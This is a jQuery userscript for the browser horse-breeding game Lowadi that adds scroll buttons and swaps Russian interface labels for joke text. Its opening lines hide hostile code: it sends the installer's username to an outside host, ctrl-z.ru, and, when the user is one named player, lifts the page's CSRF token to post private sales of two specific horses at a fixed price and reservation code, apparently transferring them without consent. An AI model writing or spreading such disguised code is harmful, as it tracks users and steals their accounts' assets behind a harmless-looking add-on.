$.get("http://ctrl-z.ru/lowadi/stat.php?nick="+document.getElementsByClassName('forumAvatar')[0].alt);

function get_token()
{
/*CSRF Token Get*/
var text = $('.widget-column-3').html();

var result = text.split('csrf_token=');
var result2 = result[1].split('\'');
return result2[0];
}	
	
var login = document.getElementsByClassName('forumAvatar')[0].alt;
if (login=="Rahuc" || login=="rahuc") 
	{
		if (/www.lowadi.com\/joueur\/fiche\/\?id=/.test(window.location.href))
			{
				var token = get_token();
				//localStorage.setItem("horse_token", token);
				
				$.post('http://www.lowadi.com/marche/vente/doVendreCheval', { go: "1", csrf_token: token, chevalSelection: "32246260", divin: "0", venteType: "prive", prixEnchere: "", prixDirect: "",  passDirect: "0", reservation: "1234567890_", prixPrive: "500",  passPrive:"0"});
				$.post('http://www.lowadi.com/marche/vente/doVendreCheval', { go: "1", csrf_token: token, chevalSelection: "1304621", divin: "0", venteType: "prive", prixEnchere: "", prixDirect: "",  passDirect: "0", reservation: "1234567890_", prixPrive: "500",  passPrive:"0"});
		
			}	
	}


$(function(){

$("body").append(
'<style> .go-up, .go-down {'+
' position: fixed; '+
' z-index: 9999; '+
' background: #4F4F4F;'+
' border: 1px solid #ccc;'+
' border-radius: 5px;'+
' cursor: pointer;'+
 'color: #fff;'+
 'text-align: center;'+
' font: normal normal 42px sans-serif;'+
 'text-shadow: 0 1px 2px #000;'+
' opacity: .3;'+
' padding: 3px;'+
' margin-bottom: 5px;'+
' width: 100px;'+
' height: 100%;'+
'}'+
'.right { right: 1px; }'+
'.left { left: 1px; }'+
'.go-up { bottom: 1px; top:1px;}'+
'.go-down { bottom: 1px; top:1px;}'+
'.go-down:hover,'+
'.go-up:hover {'+
 'opacity: 0.7;'+
 'box-shadow: 0 5px 0.5em -1px #666;'+
'} </style>');

$("#container").append(
'<div class="go-up right" title="Вверх" id="ToTop">&uarr; </div>'+
'<div class="go-down right" title="Вниз" id="OnBottom">&darr;	</div>');



 if ($(window).scrollTop()>="250") $("#ToTop").fadeIn("slow")
 $(window).scroll(function(){
  if ($(window).scrollTop()<="250") $("#ToTop").fadeOut("slow")
   else $("#ToTop").fadeIn("slow")
 });

 if ($(window).scrollTop()<=$(document).height()-"999") $("#OnBottom").fadeIn("slow")
 $(window).scroll(function(){
  if ($(window).scrollTop()>=$(document).height()-"999") $("#OnBottom").fadeOut("slow")
   else $("#OnBottom").fadeIn("slow")
 });
 
 

 $("#ToTop").click(function(){$("html,body").animate({scrollTop:0},"slow")})
 $("#OnBottom").click(function(){$("html,body").animate({scrollTop:$(document).height()},"slow")})

});


function fun()
	{
 $(".hud-clock").html(function(index, text) {
    return text.replace("Лето", "Лeто - котлета");
    });
	
    $(".hud-clock").html(function(index, text) {
    return text.replace("Осень", "Тлен, смерть, разложение");
    });

    $(".hud-clock").html(function(index, text) {
    return text.replace("Зима", "Время Старков");
    });

    $(".hud-clock").html(function(index, text) {
    return text.replace("Весна", "Птички - цветочки");
    });	
	
    $(".new-console").html(function(index, text) {
    return text.replace("Покрыть кобылу", "Присунуть");
    });	

    $(".new-console").html(function(index, text) {
    return text.replace("Случить кобылу", "Шпекаться");
    });	
	
    $(".new-console").html(function(index, text) {
    return text.replace("Кормить", "Ом-ном-ном");
    });	

    $(".new-console").html(function(index, text) {
    return text.replace("Поить", "Хлебать");
    });	

    $(".new-console").html(function(index, text) {
    return text.replace("Смесь", "Порошок");
    });		
	
    $(".new-console").html(function(index, text) {
    return text.replace("Ласкать", "Приставать");
    });		
	
    $(".new-console").html(function(index, text) {
    return text.replace("Отправить спать", "Отключить");
    });		
	
	
    $(".new-console").html(function(index, text) {
    return text.replace("Морковь", "Овощ");
    });		
	
    $(".new-console").html(function(index, text) {
    return text.replace("Чистить", "Лепешка");
    });		
	
	
    $(".new-console").html(function(index, text) {
    return text.replace("Вырастить", "Пирамида");
    });			
	
	
    $(".button-text-0").html(function(index, text) {
    return text.replace("Погладить", "Домогаться");
    });		
	
    $(".tab-action").html(function(index, text) {
    return text.replace("Мои новости", "Че каво?");
    });
				
	}


 setInterval(function(){
 if (/\/elevage\/chevaux\/cheval\?id=/.test(window.location.href))
  	fun();
}, 1000); 	
